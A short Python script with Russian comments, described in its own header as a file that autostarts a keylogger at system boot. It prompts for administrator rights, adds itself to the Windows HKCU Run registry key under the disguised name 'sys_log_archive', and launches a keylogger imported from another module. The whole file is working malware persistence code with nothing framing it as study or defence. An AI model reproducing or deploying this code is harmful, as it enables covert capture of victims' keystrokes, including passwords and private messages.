'''ФАЙЛ МАКСИМА, ПО АВТОЗАПУСКУ КЕЙЛОГЕРА, КОГДА ВКЛЮЧАЕТСЯ СИСТЕМА'''
import os
import sys
import ctypes
from recording_keyboard import start_keylogger


# функция проверки на наличие прав администратора
def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        # повышение привилегии
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False


# функция добавления файла в автозапуск
def add_to_startup():
    try:
        app_name = "sys_log_archive"  # имя для записи в автозапуске
        app_path = os.path.abspath(sys.argv[0])  # полный путь к текущему скрипту

        command = f'reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "{app_name}" /d "{app_path}" /f'
        os.system(command)

        print("Успешно добавлено в автозапуск.")
    except Exception as e:
        print("Ошибка:", str(e))


def main_startup():
    print("Для работы этого скрипта требуются права администратора.")

    if not run_as_admin():
        return

    add_to_startup()
    print("Добавлено в автозапуск.")

    # кейлогер для автозапуска
    start_keylogger()


if __name__ == "__main__":
    main_startup()
